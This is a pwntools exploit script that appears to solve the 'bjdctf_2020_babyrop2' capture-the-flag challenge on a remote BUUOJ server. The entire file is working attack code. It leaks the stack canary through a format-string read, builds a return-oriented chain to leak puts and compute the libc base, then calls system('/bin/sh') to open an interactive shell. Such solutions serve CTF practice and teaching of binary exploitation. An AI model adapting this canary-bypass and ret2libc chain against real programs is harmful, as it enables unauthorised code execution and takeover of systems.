from pwn import *
context(log_level='debug')
#io = process("./bjdctf_2020_babyrop2")
io = remote("node3.buuoj.cn",26953)
elf = ELF("./bjdctf_2020_babyrop2")
libc = ELF("./libc-x64-2.23.so")
pop_rdi_ret = 0x0000000000400993
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vuln_addr = elf.sym['vuln']
io.recv()
payload = "%7$p"
io.sendline(payload)
canary = int(io.recv(18),16)
print ("canary-->",canary)
payload = "a"*(0x20 -8) +p64(canary) + p64(123) + p64(pop_rdi_ret) + p64(puts_got)+p64(puts_plt) + p64(vuln_addr)
io.sendlineafter("story!\n",payload)
puts_addr = u64(io.recv(6).ljust(8,"\x00"))
print ("puts-->",hex(puts_addr))
base = puts_addr - libc.sym['puts']
system = base + libc.sym['system']
bin_sh = base + libc.search('/bin/sh').next()
payload = b"a"*(0x18) +p64(canary) + p64(0) +p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
io.sendline(payload)
io.interactive()